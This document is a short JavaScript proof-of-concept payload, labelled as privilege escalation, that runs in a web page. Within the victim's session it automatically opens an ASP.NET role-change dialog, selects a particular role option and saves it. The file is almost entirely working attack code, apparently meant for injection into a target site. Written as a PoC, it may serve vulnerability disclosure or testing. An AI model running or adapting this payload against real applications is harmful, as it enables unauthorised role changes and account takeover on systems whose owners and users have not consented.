alert("Privilege Escalation PoC , change user account role");
// Helper: wait for an element to appear in the DOM
function waitForElement(selector, timeout = 5000, interval = 100) {
  return new Promise((resolve, reject) => {
    const startTime = Date.now();

    const check = () => {
      const el = document.querySelector(selector);
      if (el) {
        resolve(el);
      } else if (Date.now() - startTime >= timeout) {
        reject(new Error(`Element not found within ${timeout}ms: ${selector}`));
      } else {
        setTimeout(check, interval);
      }
    };

    check();
  });
}

async function runFlow() {
  try {
    // 1. Click the first button (opens the modal)
    const button = document.getElementById('ContentPlaceHolder1_btnChangeRole');
    if (!button) throw new Error('First button not found');
    button.click();

    // 2. Wait for the radio button to appear inside the modal, then check it
    const radio = await waitForElement('#ContentPlaceHolder1_rblRoles_2');
    radio.checked = true;
    radio.dispatchEvent(new Event('change', { bubbles: true }));

    // 3. Wait for the submit button to appear, then click it
    const submitBtn = await waitForElement('#ContentPlaceHolder1_btnSaveRole');
    submitBtn.click();

    console.log('Flow completed successfully.');
  } catch (err) {
    console.error(err.message);
  }
}

runFlow();
